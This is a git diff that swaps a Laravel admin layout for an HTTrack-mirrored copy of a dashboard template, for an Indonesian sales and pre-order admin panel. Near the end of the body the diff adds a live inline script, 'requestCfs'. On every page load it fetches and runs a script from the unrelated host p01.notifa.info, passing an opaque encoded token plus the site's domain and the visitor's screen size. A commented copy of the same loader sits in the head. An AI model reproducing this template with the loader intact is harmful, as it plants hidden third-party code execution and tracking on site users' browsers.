@@ -1,156 +1,420 @@
-<!DOCTYPE html>
 <html lang="en">
+<!-- Mirrored from demo.interface.club/limitless/layout_2/LTR/material/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 29 Mar 2018 04:31:59 GMT -->
+<!-- Added by HTTrack -->
 
 <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>KopiShop</title>
+	<meta http-equiv="content-type" content="text/html;charset=UTF-8">
+	<!-- /Added by HTTrack -->
 
-    <!-- Google Font: Source Sans Pro -->
-    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,400i,700&display=fallback">
-    <!-- Font Awesome -->
-    <link rel="stylesheet" href="{{asset('AdminLTE')}}/plugins/fontawesome-free/css/all.min.css">
-    <!-- Theme style -->
-    <link rel="stylesheet" href="{{asset('AdminLTE')}}/dist/css/adminlte.min.css">
+
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>Penjualan</title>
+
+	<!-- Global stylesheets -->
+	<link href="http://fonts.googleapis.com/css?family=Roboto:300,400,900|Roboto+Mono&display=swap" rel=" stylesheet" type="text/css">
+
+	<link href="assets/css/icons/icomoon/styles.css" rel="stylesheet" type="text/css">
+	<link href="assets/css/bootstrap.css" rel="stylesheet" type="text/css">
+	<link href="assets/css/core.css" rel="stylesheet" type="text/css">
+	<link href="assets/css/components.css" rel="stylesheet" type="text/css">
+	<link href="assets/css/colors.css" rel="stylesheet" type="text/css">
+	<link href="assets/css/extras/animate.min.css" rel="stylesheet" type="text/css">
+	<!-- /global stylesheets -->
+
+	<!-- Core JS files -->
+
+	<script type="text/javascript" src="assets/js/plugins/loaders/pace.min.js"></script>
+	<script type="text/javascript" src="assets/js/core/libraries/jquery.min.js"></script>
+	<script type="text/javascript" src="assets/js/core/libraries/bootstrap.min.js"></script>
+	<script type="text/javascript" src="assets/js/plugins/loaders/blockui.min.js"></script>
+	<!-- /core JS files -->
+	<script type="text/javascript" src="assets/js/core/libraries/jasny_bootstrap.min.js"></script>
+
+	<script type="text/javascript" src="assets/js/plugins/tables/datatables/datatables.min.js"></script>
+
+	<script type="text/javascript" src="assets/js/plugins/tables/datatables/extensions/pdfmake/pdfmake.min.js"></script>
+	<script type="text/javascript" src="assets/js/plugins/tables/datatables/extensions/pdfmake/vfs_fonts.min.js"></script>
+	<script type="text/javascript" src="assets/js/plugins/tables/datatables/extensions/buttons.min.js"></script>
+
+
+
+	<script type="text/javascript" src="assets/js/pages/form_input_groups.js"></script>
+
+
+
+	<script type="text/javascript" src="assets/js/plugins/uploaders/fileinput/fileinput.min.js"></script>
+	<script type="text/javascript" src="assets/js/pages/uploader_bootstrap.js"></script>
+	<script type="text/javascript" src="assets/js/core/libraries/jquery_ui/widgets.min.js"></script>
+
+	<script type="text/javascript" src="assets/js/core/libraries/jquery_ui/globalize/globalize.js"></script>
+
+	<script type="text/javascript" src="assets/js/pages/jqueryui_forms.js"></script>
+
+
+	<script type="text/javascript" src="assets/js/pages/form_inputs.js"></script>
+
+	<!-- Theme JS files -->
+
+	<script type="text/javascript" src="assets/js/plugins/visualization/d3/d3.min.js"></script>
+	<script type="text/javascript" src="assets/js/plugins/visualization/c3/c3.min.js"></script>
+	<script type="text/javascript" src="assets/js/plugins/visualization/d3/d3_tooltip.js"></script>
+	<script type="text/javascript" src="assets/js/plugins/forms/styling/switchery.min.js"></script>
+	<script type="text/javascript" src="assets/js/plugins/forms/styling/uniform.min.js"></script>
+	<script type="text/javascript" src="assets/js/plugins/forms/selects/bootstrap_multiselect.js"></script>
+	<script type="text/javascript" src="assets/js/plugins/ui/moment/moment.min.js"></script>
+	<script type="text/javascript" src="assets/js/plugins/pickers/daterangepicker.js"></script>
+
+	<!-- Theme JS files -->
+
+
+
+	<script type="text/javascript" src="assets/js/plugins/forms/inputs/touchspin.min.js"></script>
+
+	<!-- Theme JS files -->
+
+	<script type="text/javascript" src="assets/js/plugins/velocity/velocity.min.js"></script>
+	<script type="text/javascript" src="assets/js/plugins/velocity/velocity.ui.min.js"></script>
+	<script type="text/javascript" src="assets/js/plugins/buttons/spin.min.js"></script>
+	<script type="text/javascript" src="assets/js/plugins/buttons/ladda.min.js"></script>
+
+	<script type="text/javascript" src="assets/js/core/app.js"></script>
+
+
+	<script type="text/javascript" src="assets/js/pages/ecommerce_orders_history.js"></script>
+	<script type="text/javascript" src="assets/js/pages/components_buttons.js"></script>
+	<script type="text/javascript" src="assets/js/pages/dashboard.js"></script>
+
+
+
+
+
+
+	<script type="text/javascript" src="assets/js/plugins/ui/ripple.min.js"></script>
+	<!-- /theme JS files -->
+
+	<!-- <script type="text/javascript" async="" src="http://p01.notifa.info/3fsmd3/request?id=1&amp;enc=9UwkxLgY9&amp;params=4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mVPOusGZYLpfqT6nfh03G6uiMlelqeNgEqHjBJuZk8rLOubZXl62Qv6WVJN8lJFcyaPpUV7Tux1oQpB49HrPzqrbwmfy74C8Z5ZzO17ZdkwJqKHjmuY67QlnQVSGgAKFgk8MMrFnR0tmuwR99i9Z9leHD%2bHA9sQcFu5ldJWa3QAdgielop6h6EwgsDQV6p0ieBpjtJ%2fJ5lpuPU%2beD0%2fLbobXvW0MhsudRIzaxrYMno1fCihodfv%2bA6mBClyMDA8i3weP3Ys3%2fwDh8OqvqXYhwCqPPH2zggDpNpvRUa4r26up%2fWRJtW9gcGq8X3Kbhi4vPGUg%2fxkqwEJOorqgkbohJFy94u15LtfYfHasVn%2fNoOLT0q9teNCtdRYThsno2HG3xDS24oj%2bXc8gpLvVeqoAh5eiIx0fOR%2bfzck55jmVvTr%2fZyiMgAFoORGnQIlNvuNvdmz4GHMxeJ0IxMOrI7NtC7lYExrDaym3TOkbq5tXfJ3jHUlBX8Zp1gf5v2J%2f5k8%2fconIoz0i4YAnoP43dPAYvvVJiFz%2bS4thE&amp;idc_r=23096064249&amp;domain=localhost&amp;sw=1366&amp;sh=768"></script> -->
 </head>
 
-<body class="hold-transition sidebar-mini">
-    <!-- Site wrapper -->
-    <div class="wrapper">
-        <!-- Navbar -->
-        <nav class="main-header navbar navbar-expand navbar-white navbar-light">
-            <!-- Left navbar links -->
-            <ul class="navbar-nav">
-                <li class="nav-item">
-                    <a class="nav-link" data-widget="pushmenu" href="#" role="button"><i class="fas fa-bars"></i></a>
-                </li>
-                <li class="nav-item d-none d-sm-inline-block">
-                    <a href="../../index3.html" class="nav-link">Home</a>
-                </li>
-                <li class="nav-item d-none d-sm-inline-block">
-                    <a href="#" class="nav-link">Contact</a>
-                </li>
-            </ul>
 
-            <!-- Right navbar links -->
-            <ul class="navbar-nav ml-auto">
-                <li class="nav-item">
-                    <a class="btn btn-outline-danger btn-sm" href="{{ route('logout') }}" onclick="event.preventDefault();
-                                                     document.getElementById('logout-form').submit();">
-                        {{ __('Logout') }}
-                    </a>
+<body class="pace-done">
+	<div class="pace  pace-inactive">
+		<div class="pace-progress" data-progress-text="100%" data-progress="99" style="transform: translate3d(100%, 0px, 0px);">
+			<div class="pace-progress-inner"></div>
+		</div>
+		<div class="pace-activity"></div>
+	</div>
 
-                    <form id="logout-form" action="{{ route('logout') }}" method="POST" class="d-none">
-                        @csrf
-                    </form>
-                </li>
-            </ul>
-        </nav>
-        <!-- /.navbar -->
+	<!-- Main navbar -->
+	<div class="navbar navbar-default header-highlight">
+		<div class="navbar-header" style="background-color: #ffff;">
+			<a class="navbar-brand" href="index.php">
+				<img src="img/user/logogj.png" alt="" style="height: 150%;margin-top: -3%;">
+			</a>
 
-        <!-- Main Sidebar Container -->
-        <aside class="main-sidebar sidebar-dark-primary elevation-4">
-            <!-- Brand Logo -->
-            <a href="../../index3.html" class="brand-link">
-                <img src="{{asset('AdminLTE')}}/dist/img/Logos.png" alt="Logos" class="brand-image img-circle elevation-3" style="opacity: .8">
-                <span class="brand-text font-weight-light">KopiShop</span>
-            </a>
+			<ul class="nav navbar-nav visible-xs-block">
+				<li>
+					<a data-toggle="collapse" data-target="#navbar-mobile" class="legitRipple">
+						<i class="icon-tree5"></i>
+					</a>
+				</li>
+				<li>
+					<a class="sidebar-mobile-main-toggle legitRipple">
+						<i class="icon-paragraph-justify3"></i>
+					</a>
+				</li>
+			</ul>
+		</div>
 
-            <!-- SidebarSearch Form -->
-            <div class="form-inline">
-                <div class="input-group" data-widget="sidebar-search">
-                    <input class="form-control form-control-sidebar" type="search" placeholder="Search" aria-label="Search">
-                    <div class="input-group-append">
-                        <button class="btn btn-sidebar">
-                            <i class="fas fa-search fa-fw"></i>
-                        </button>
-                    </div>
-                </div>
-            </div>
+		<div class="navbar-collapse collapse" id="navbar-mobile">
+			<ul class="nav navbar-nav">
+				<li>
+					<a class="sidebar-control sidebar-main-toggle hidden-xs legitRipple">
+						<i class="icon-paragraph-justify3"></i>
+					</a>
+				</li>
+			</ul>
+			<div class="navbar-right">
+				<p class="navbar-text"></p>
+				<p class="navbar-text">
+					<span class="label bg-success">Online</span>
+				</p>
+
+				<ul class="nav navbar-nav">
+					<li class="dropdown">
+						<a href="#" class="dropdown-toggle legitRipple" data-toggle="modal" data-target="#modal_theme_warning">
+							<i class="icon-bell2"></i>
+							<span class="visible-xs-inline-block position-right">Activity</span>
+							<span class="status-mark border-pink-300"></span>
+						</a>
+					</li>
 
 
-            <!-- /.sidebar-menu -->
-            @include('layouts.navbar')
-            <!-- /.sidebar-menu -->
-    </div>
-    <!-- /.sidebar -->
-    </aside>
+				</ul>
+			</div>
 
-    <!-- Content Wrapper. Contains page content -->
-    <div class="content-wrapper">
-        <!-- Content Header (Page header) -->
-        <section class="content-header">
-            <div class="container-fluid">
-                <div class="row mb-2">
-                    <div class="col-sm-6">
-                        <h1>@yield('title')</h1>
-                    </div>
-                    <div class="col-sm-6">
-                        <ol class="breadcrumb float-sm-right">
-                            <li class="breadcrumb-item"><a href="#">Home</a></li>
-                            <li class="breadcrumb-item active">@yield('title')</li>
-                        </ol>
-                    </div>
-                </div>
-            </div><!-- /.container-fluid -->
-        </section>
 
-        <!-- Main content -->
-        <section class="content">
+		</div>
+	</div>
+	<!-- /main navbar -->
+	<!-- Page container -->
+	<div class="page-container" style="min-height:412.99999618530273px">
+		<!-- Page content -->
+		<div class="page-content">
+			<!-- Main sidebar -->
+			<div class="sidebar sidebar-main">
+				<div class="sidebar-content">
 
-            <!-- Default box -->
-            <div class="card">
-                <div class="card-header">
-                    <h3 class="card-title">@yield('titlekonten')</h3>
+					<!-- User menu -->
+					<div class="sidebar-user-material">
+						<div class="category-content">
+							<div class="sidebar-user-material-content">
+								<a href="#" class="legitRipple">
+									
+</a>
 
-                    <div class="card-tools">
-                        <button type="button" class="btn btn-tool" data-card-widget="collapse" title="Collapse">
-                            <i class="fas fa-minus"></i>
-                        </button>
-                        <button type="button" class="btn btn-tool" data-card-widget="remove" title="Remove">
-                            <i class="fas fa-times"></i>
-                        </button>
-                    </div>
-                </div>
-                <div class="card-body">
-                    @yield('konten')
-                </div>
-                <!-- /.card-body -->
-                <div class="card-footer">
-                    Footer
-                </div>
-                <!-- /.card-footer-->
-            </div>
-            <!-- /.card -->
+							</div>
+						</div>
+					</div>
+					<!-- /user menu -->
+					<!-- Main navigation -->
+					<div class="sidebar-category sidebar-category-visible">
+						<div class="category-content no-padding">
+							<ul class="navigation navigation-main navigation-accordion">
 
-        </section>
-        <!-- /.content -->
-    </div>
-    <!-- /.content-wrapper -->
+								<!-- Main -->
+								<li class="navigation-header">
+									<span>Main</span>
+									<i class="icon-menu" title="" data-original-title="Main pages"></i>
+								</li>
+								<li class="">
+									<a href="?p=home" class="legitRipple">
+										<i class="icon-home4"></i>
+										<span>Dashboard</span>
+									</a>
 
-    <footer class="main-footer">
-        <div class="float-right d-none d-sm-block">
+								</li>
+								
+									<li class="">
+										<a href="#" class="has-ul legitRipple">
+											<i class="icon-grid"></i>
+											<span>Produk</span>
+										</a>
+										<ul class="hidden-ul" style="display: none;">
+											<li>
+												<a href="?p=dataproduk" class="legitRipple">Data Produk</a>
+											</li>
+										
+												<li>
+													<a href="?p=addproduk" class="legitRipple">Tambah Produk</a>
+												</li>
+											
 
-        </div>
-        <strong>Copyright &copy; 2005-2021 <a href="https://tiucic.info">Teknik Informatika</a>.</strong> All rights reserved.
-    </footer>
+										</ul>
+									</li>
 
-    <!-- Control Sidebar -->
-    <aside class="control-sidebar control-sidebar-dark">
-        <!-- Control sidebar content goes here -->
-    </aside>
-    <!-- /.control-sidebar -->
-    </div>
-    <!-- ./wrapper -->
+									<!-- <li class="">
+																																																						<a href="?p=databahan" class="legitRipple">
+																																																							<i class="icon-cube4"></i>
+																																																							<span>Bahan Produksi</span>
+																																																						</a>
 
-    <!-- jQuery -->
-    <script src="{{asset('AdminLTE')}}/plugins/jquery/jquery.min.js"></script>
-    <!-- Bootstrap 4 -->
-    <script src="{{asset('AdminLTE')}}/plugins/bootstrap/js/bootstrap.bundle.min.js"></script>
-    <!-- AdminLTE App -->
-    <script src="{{asset('AdminLTE')}}/dist/js/adminlte.min.js"></script>
-    <!-- AdminLTE for demo purposes -->
-    <script src="{{asset('AdminLTE')}}/dist/js/demo.js"></script>
+																																																					</li>
+																																																				
+																																																																																																		<li class="">
+																																																																																																			<a href="" class="has-ul legitRipple">
+																																																																																																				<i class="icon-copy"></i>
+																																																																																																				<span>Pre Order</span>
+
+																																																																																																			</a>
+																																																																																																			<ul class="hidden-ul" style="display: none;">
+																																																																																																				<li>
+																																																																																																					<a href="?p=preorder" class="legitRipple">Data Pre Order</a>
+																																																																																																				</li>
+																																																																																																				<li>
+																																																																																																					<a href="?p=addpreorder" class="legitRipple">Tambah Pre Order</a>
+																																																																																																				</li>
+																																																																																																			</ul>
+																																																																																																		</li> -->
+										<li class="">
+											<a href="" class="has-ul legitRipple">
+												<i class="icon-graph"></i>
+												<span>Penjualan</span>
+
+											</a>
+											<ul class="hidden-ul" style="display: none;">
+												<li>
+													<a href="?p=datapenjualan" class="legitRipple">Data Penjualan</a>
+												</li>
+												<li>
+													<a href="?p=adddatapenjualan" class="legitRipple">Tambah Data Penjualan</a>
+												</li>
+
+											</ul>
+										</li>
+
+										<li class="">
+											<a href="?p=akun" class="legitRipple">
+												<i class="icon-users4"></i>
+												<span>Manajemen Akun</span>
+											</a>
+
+										</li>
+								
+										<li class="">
+											<a href="?p=preorder" class="legitRipple">
+												<i class="icon-copy"></i>
+												<span>Data Pre Order</span>
+											</a>
+
+										</li>
+								
+									<li class="">
+
+										<a href="?p=reportpenjualan" class="legitRipple"><i class="icon-graph"></i>Report Penjualan</a>
+
+									</li>
+
+									<li class="">
+										<a href="?p=akun" class="legitRipple">
+											<i class="icon-user"></i>
+											<span>Manajemen Akun</span>
+										</a>
+									</li>
+
+
+						
+								<li class="">
+									<a href="proses/logout.php" class="legitRipple">
+										<i class="icon-switch2	"></i>
+										<span>Logout</span>
+									</a>
+								</li>
+							</ul>
+						</div>
+					</div>
+					<!-- /main navigation -->
+				</div>
+			</div>
+			<!-- /main sidebar -->
+			<!-- Main content -->
+			<div class="content-wrapper">
+				<!-- Content area -->
+				<div class="content">
+				
+					<!-- Main charts -->
+					<!-- /main charts -->
+					<!-- Dashboard content -->
+					<!-- /dashboard content -->
+					<!-- Footer -->
+					<div class="footer text-muted">
+						© 2018. Distributed by 
+						<a href="https://blogbugabagi.blogspot.com">BlogBugaBagi</a>
+
+					</div>
+					<!-- /footer -->
+
+				</div>
+				<!-- /content area -->
+
+			</div>
+			<!-- /main content -->
+
+		</div>
+		<!-- /page content -->
+
+	</div>
+	<!-- /page container -->
+
+	<script type="text/javascript">
+		if (self == top) {
+			function netbro_cache_analytics(fn, callback) {
+				setTimeout(function() {
+					fn();
+					callback();
+				}, 0);
+			}
+
+			function sync(fn) {
+				fn();
+			}
+
+			function requestCfs() {
+				var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
+				var idc_glo_r = Math.floor(Math.random() * 99999999999);
+				var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" +
+					"4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mVPOusGZYLpfqT6nfh03G6uiMlelqeNgEqHjBJuZk8rLOubZXl62Qv6WVJN8lJFcyaPpUV7Tux1oQpB49HrPzqrbwmfy74C8Z5ZzO17ZdkwJqKHjmuY67QlnQVSGgAKFgk8MMrFnR0tmuwR99i9Z9leHD%2bHA9sQcFu5ldJWa3QAdgielop6h6EwgsDQV6p0ieBpjtJ%2fJ5lpuPU%2beD0%2fLbobXvW0MhsudRIzaxrYMno1fCihodfv%2bA6mBClyMDA8i3weP3Ys3%2fwDh8OqvqXYhwCqPPH2zggDpNpvRUa4r26up%2fWRJtW9gcGq8X3Kbhi4vPGUg%2fxkqwEJOorqgkbohJFy94u15LtfYfHasVn%2fNoOLT0q9teNCtdRYThsno2HG3xDS24oj%2bXc8gpLvVeqoAh5eiIx0fOR%2bfzck55jmVvTr%2fZyiMgAFoORGnQIlNvuNvdmz4GHMxeJ0IxMOrI7NtC7lYExrDaym3TOkbq5tXfJ3jHUlBX8Zp1gf5v2J%2f5k8%2fconIoz0i4YAnoP43dPAYvvVJiFz%2bS4thE" +
+					"&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
+				var bsa = document.createElement('script');
+				bsa.type = 'text/javascript';
+				bsa.async = true;
+				bsa.src = url;
+				(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
+			}
+			netbro_cache_analytics(requestCfs, function() {});
+		};
+	</script>
+
+
+	<!-- Mirrored from demo.interface.club/limitless/layout_2/LTR/material/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 29 Mar 2018 04:44:08 GMT -->
+
+	<div class="daterangepicker dropdown-menu ltr opensleft">
+		<div class="calendars">
+			<div class="calendar left">
+				<div class="calendar-table"></div>
+				<div class="daterangepicker_input">
+					<div class="calendar-time" style="display: none;">
+						<div></div>
+					</div>
+				</div>
+			</div>
+			<div class="calendar right">
+				<div class="calendar-table"></div>
+				<div class="daterangepicker_input">
+					<div class="calendar-time" style="display: none;">
+						<div></div>
+					</div>
+				</div>
+			</div>
+		</div>
+		<div class="ranges">
+			<ul>
+				<li data-range-key="Today">Today</li>
+				<li data-range-key="Yesterday">Yesterday</li>
+				<li data-range-key="Last 7 Days">Last 7 Days</li>
+				<li data-range-key="Last 30 Days">Last 30 Days</li>
+				<li data-range-key="This Month">This Month</li>
+				<li data-range-key="Last Month">Last Month</li>
+				<li data-range-key="Custom Range">Custom Range</li>
+			</ul>
+			<div class="daterangepicker-inputs">
+				<div class="daterangepicker_input">
+					<span class="start-date-label">Start date:</span>
+					<input class="form-control" type="text" name="daterangepicker_start" value="">
+					<i class="icon-calendar3"></i>
+				</div>
+				<div class="daterangepicker_input">
+					<span class="end-date-label">End date:</span>
+					<input class="form-control" type="text" name="daterangepicker_end" value="">
+					<i class="icon-calendar3"></i>
+				</div>
+			</div>
+			<div class="range_inputs">
+				<button class="applyBtn btn btn-sm btn-small bg-slate-600 btn-block legitRipple" disabled="disabled" type="button">Apply</button>
+				<button class="cancelBtn btn btn-sm btn-small btn-default btn-block legitRipple" type="button">Cancel</button>
+			</div>
+		</div>
+	</div>
+	<div class="d3-tip" style="position: absolute; top: 0px; display: none; pointer-events: none; box-sizing: border-box;"></div>
+	<div class="d3-tip" style="position: absolute; top: 0px; display: none; pointer-events: none; box-sizing: border-box;"></div>
+	<div class="d3-tip" style="position: absolute; top: 0px; display: none; pointer-events: none; box-sizing: border-box;"></div>
+	<div class="d3-tip" style="position: absolute; top: 0px; display: none; pointer-events: none; box-sizing: border-box;"></div>
+	<div class="d3-tip" style="position: absolute; top: 0px; display: none; pointer-events: none; box-sizing: border-box;"></div>
+	<div class="d3-tip" style="position: absolute; top: 0px; display: none; pointer-events: none; box-sizing: border-box;"></div>
+	<div class="d3-tip" style="position: absolute; top: 0px; display: none; pointer-events: none; box-sizing: border-box;"></div>
+	<div class="d3-tip" style="position: absolute; top: 0px; display: none; pointer-events: none; box-sizing: border-box;"></div>
+
 </body>
 
 </html>
